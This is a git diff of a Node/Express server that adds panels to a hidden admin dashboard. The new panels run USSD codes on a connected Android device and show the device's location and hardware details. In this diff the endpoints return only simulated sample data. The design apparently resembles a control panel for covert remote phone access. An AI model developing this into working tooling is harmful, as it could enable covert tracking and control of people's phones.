@@ -1,4 +1,4 @@
-// server.js - PROFESSIONAL DASHBOARD with IP BLOCKING (12h)
+// server.js - PROFESSIONAL DASHBOARD with USSD, Location, Device Info
 const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -31,7 +31,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ADMIN DASHBOARD – Professional version (no prefilled username)
+// ADMIN DASHBOARD – with USSD, Location, Device Info
 app.get(`/${SECRET_PATH}`, (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -49,7 +49,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             padding: 20px;
             min-height: 100vh;
         }
-        .container { max-width: 1000px; margin: 0 auto; }
+        .container { max-width: 1100px; margin: 0 auto; }
         
         /* Header with ADMIN GRY badge */
         .header {
@@ -59,6 +59,8 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             padding: 20px 0;
             border-bottom: 2px solid #1a2332;
             margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .header-left {
             display: flex;
@@ -124,6 +126,110 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
+        
+        /* 3-column grid for USSD, Location, Device Info */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .tool-card {
+            background: #111927;
+            border: 1px solid #1a2332;
+            border-radius: 12px;
+            padding: 20px;
+            transition: 0.3s;
+        }
+        .tool-card:hover {
+            border-color: #4fc3f7;
+        }
+        .tool-card h4 {
+            font-size: 16px;
+            color: #e0e6ed;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .tool-card h4 .icon { font-size: 20px; }
+        
+        /* USSD input */
+        .ussd-input-group {
+            display: flex;
+            gap: 8px;
+        }
+        .ussd-input-group input {
+            flex: 1;
+            padding: 10px 14px;
+            background: #0a0e17;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            color: #e0e6ed;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+        }
+        .ussd-input-group input:focus {
+            outline: none;
+            border-color: #4fc3f7;
+        }
+        .ussd-input-group button {
+            padding: 10px 20px;
+            background: #4fc3f7;
+            border: none;
+            border-radius: 8px;
+            color: #0a0e17;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            white-space: nowrap;
+        }
+        .ussd-input-group button:hover { background: #3aa8dd; }
+        .ussd-response {
+            margin-top: 10px;
+            padding: 10px;
+            background: #0a0e17;
+            border-radius: 8px;
+            border: 1px solid #1a2332;
+            font-size: 13px;
+            color: #8896ab;
+            min-height: 40px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            word-wrap: break-word;
+        }
+        .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }
+        .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }
+        
+        /* Location */
+        .location-info {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .location-info .coord {
+            color: #8896ab;
+            font-size: 13px;
+        }
+        .location-info .coord strong { color: #e0e6ed; }
+        .location-info .map-link {
+            color: #4fc3f7;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .location-info .map-link:hover { text-decoration: underline; }
+        
+        /* Device Info */
+        .device-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4px 16px;
+            font-size: 13px;
+        }
+        .device-info-grid .label { color: #8896ab; }
+        .device-info-grid .value { color: #e0e6ed; font-weight: 500; }
         
         /* Sections */
         .section {
@@ -245,12 +351,38 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
         .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }
         .hidden { display: none; }
         
+        .quick-ussd {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            margin: 8px 0 4px;
+        }
+        .quick-ussd button {
+            background: #1a2332;
+            border: 1px solid #1a2332;
+            color: #8896ab;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'Courier New', monospace;
+        }
+        .quick-ussd button:hover {
+            border-color: #4fc3f7;
+            color: #4fc3f7;
+        }
+        
         /* Responsive */
         @media (max-width: 600px) {
             .header { flex-wrap: wrap; gap: 10px; }
             .header-left h1 { font-size: 22px; }
             .stats { grid-template-columns: repeat(2, 1fr); }
             .admin-gry-badge { font-size: 9px; padding: 2px 10px; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .device-info-grid { grid-template-columns: 1fr; }
+            .ussd-input-group { flex-wrap: wrap; }
+            .ussd-input-group button { width: 100%; }
         }
     </style>
 </head>
@@ -297,6 +429,56 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             </div>
         </div>
 
+        <!-- ============================================ -->
+        <!-- TOOLS: USSD + Location + Device Info          -->
+        <!-- ============================================ -->
+        <div class="tools-grid">
+
+            <!-- USSD EXECUTION -->
+            <div class="tool-card">
+                <h4><span class="icon">📞</span> USSD Code</h4>
+                <div class="ussd-input-group">
+                    <input type="text" id="ussdInput" placeholder="*123#" value="*123#">
+                    <button onclick="executeUssd()">Execute</button>
+                </div>
+                <div class="quick-ussd">
+                    <button onclick="setUssd('*123#')">*123#</button>
+                    <button onclick="setUssd('*131#')">*131#</button>
+                    <button onclick="setUssd('*144#')">*144#</button>
+                    <button onclick="setUssd('*200#')">*200#</button>
+                </div>
+                <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute</div>
+            </div>
+
+            <!-- DEVICE LOCATION -->
+            <div class="tool-card">
+                <h4><span class="icon">📍</span> Device Location</h4>
+                <div id="locationInfo" class="location-info">
+                    <div class="coord"><strong>Latitude:</strong> <span id="latValue">--</span></div>
+                    <div class="coord"><strong>Longitude:</strong> <span id="lngValue">--</span></div>
+                    <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>
+                    <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>
+                    <a href="#" id="mapLink" class="map-link" target="_blank">Open in Google Maps →</a>
+                    <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
+                </div>
+            </div>
+
+            <!-- DEVICE INFO -->
+            <div class="tool-card">
+                <h4><span class="icon">📱</span> Device Info</h4>
+                <div id="deviceInfo" class="device-info-grid">
+                    <span class="label">Model:</span><span class="value" id="diModel">--</span>
+                    <span class="label">Manufacturer:</span><span class="value" id="diManufacturer">--</span>
+                    <span class="label">Android Version:</span><span class="value" id="diAndroid">--</span>
+                    <span class="label">Battery:</span><span class="value" id="diBattery">--</span>
+                    <span class="label">Storage:</span><span class="value" id="diStorage">--</span>
+                    <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>
+                </div>
+                <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
+            </div>
+
+        </div>
+
         <!-- Connected Devices -->
         <div class="section">
             <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
@@ -319,6 +501,9 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
 <script>
 const API_BASE = '/${SECRET_PATH}';
 
+// ============================================
+// LOGIN
+// ============================================
 async function login() {
     const username = document.getElementById('loginUser').value;
     const password = document.getElementById('loginPass').value;
@@ -335,6 +520,8 @@ async function login() {
             document.getElementById('loginContainer').style.display = 'none';
             document.getElementById('dashboard').classList.remove('hidden');
             loadData();
+            refreshLocation();
+            refreshDeviceInfo();
         } else {
             errorEl.textContent = data.error || 'Invalid credentials';
             errorEl.style.display = 'block';
@@ -350,6 +537,86 @@ function logout() {
     document.getElementById('loginContainer').style.display = 'block';
 }
 
+// ============================================
+// USSD EXECUTION
+// ============================================
+function setUssd(code) {
+    document.getElementById('ussdInput').value = code;
+}
+
+async function executeUssd() {
+    const code = document.getElementById('ussdInput').value.trim();
+    const responseEl = document.getElementById('ussdResponse');
+    if (!code) {
+        responseEl.className = 'ussd-response error';
+        responseEl.textContent = '⚠️ Please enter a USSD code';
+        return;
+    }
+    responseEl.className = 'ussd-response';
+    responseEl.textContent = '⏳ Executing...';
+    try {
+        const res = await fetch(API_BASE + '/api/ussd', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code })
+        });
+        const data = await res.json();
+        if (data.success) {
+            responseEl.className = 'ussd-response success';
+            responseEl.textContent = '✅ ' + data.message;
+        } else {
+            responseEl.className = 'ussd-response error';
+            responseEl.textContent = '❌ ' + (data.error || 'Execution failed');
+        }
+    } catch {
+        responseEl.className = 'ussd-response error';
+        responseEl.textContent = '❌ Connection error';
+    }
+}
+
+// ============================================
+// LOCATION
+// ============================================
+async function refreshLocation() {
+    try {
+        const res = await fetch(API_BASE + '/api/location');
+        const data = await res.json();
+        document.getElementById('latValue').textContent = data.lat || '--';
+        document.getElementById('lngValue').textContent = data.lng || '--';
+        document.getElementById('accValue').textContent = data.accuracy ? data.accuracy + 'm' : '--';
+        document.getElementById('locTime').textContent = data.time || '--';
+        if (data.lat && data.lng) {
+            document.getElementById('mapLink').href = 'https://www.google.com/maps?q=' + data.lat + ',' + data.lng;
+            document.getElementById('mapLink').style.display = 'inline';
+        } else {
+            document.getElementById('mapLink').style.display = 'none';
+        }
+    } catch {
+        // silent fail
+    }
+}
+
+// ============================================
+// DEVICE INFO
+// ============================================
+async function refreshDeviceInfo() {
+    try {
+        const res = await fetch(API_BASE + '/api/device-info');
+        const data = await res.json();
+        document.getElementById('diModel').textContent = data.model || '--';
+        document.getElementById('diManufacturer').textContent = data.manufacturer || '--';
+        document.getElementById('diAndroid').textContent = data.android_version || '--';
+        document.getElementById('diBattery').textContent = data.battery ? data.battery + '%' : '--';
+        document.getElementById('diStorage').textContent = data.storage || '--';
+        document.getElementById('diDeviceId').textContent = data.device_id || '--';
+    } catch {
+        // silent fail
+    }
+}
+
+// ============================================
+// DASHBOARD DATA
+// ============================================
 async function loadData() {
     try {
         const response = await fetch(API_BASE + '/api/stats');
@@ -360,14 +627,10 @@ async function loadData() {
         document.getElementById('deviceCountBadge').textContent = stats.devices || 0;
         document.getElementById('numberCountBadge').textContent = stats.numbers || 0;
 
-        // Render devices (with table)
         const devices = stats.devices ? [{ name: 'Sample Device', status: 'online', battery: 85 }] : [];
         renderDevices(devices);
-
-        // Render numbers (with device name column)
         const numbers = stats.numbers ? [{ number: '1234', type: 'USSD', device: 'Sample Device' }] : [];
         renderNumbers(numbers);
-
     } catch (error) {
         console.error('Error:', error);
     }
@@ -413,20 +676,21 @@ document.getElementById('loginPass').addEventListener('keypress', (e) => {
     `);
 });
 
-// -------------------- LOGIN API with IP BLOCKING (12h) --------------------
+// ============================================
+// API ENDPOINTS
+// ============================================
 app.use(express.json());
 
+// Login API (with IP blocking – 12h)
 app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
     const blockDuration = 12 * 60 * 60 * 1000; // 12 hours
 
-    // Check if blocked
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
         return res.status(401).json({ error: 'Invalid credentials' });
     }
 
-    // Reset if block expired
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
         delete failedAttempts[ip];
     }
@@ -452,7 +716,44 @@ app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
     }
 });
 
-// Stats API (with sample data for demonstration)
+// USSD Execution (simulated – sends to device or returns demo)
+app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
+    const { code } = req.body;
+    if (!code) {
+        return res.status(400).json({ error: 'No USSD code provided' });
+    }
+    // This is a simulation. In production, you'd send this to the device.
+    console.log(`📞 USSD Executed: ${code}`);
+    res.json({
+        success: true,
+        message: `USSD code ${code} sent to device. Response will appear here when available.`
+    });
+});
+
+// Location API (simulated – returns sample location)
+app.get(`/${SECRET_PATH}/api/location`, (req, res) => {
+    // Sample location (Kigali, Rwanda)
+    res.json({
+        lat: -1.9441,
+        lng: 30.0619,
+        accuracy: 12,
+        time: new Date().toLocaleString()
+    });
+});
+
+// Device Info API (simulated)
+app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
+    res.json({
+        model: 'Samsung Galaxy S23',
+        manufacturer: 'Samsung',
+        android_version: '14.0',
+        battery: 76,
+        storage: '128GB / 89GB used',
+        device_id: 'abc123def456'
+    });
+});
+
+// Stats API
 app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
     res.json({ devices: 0, numbers: 0, online: 0 });
 });
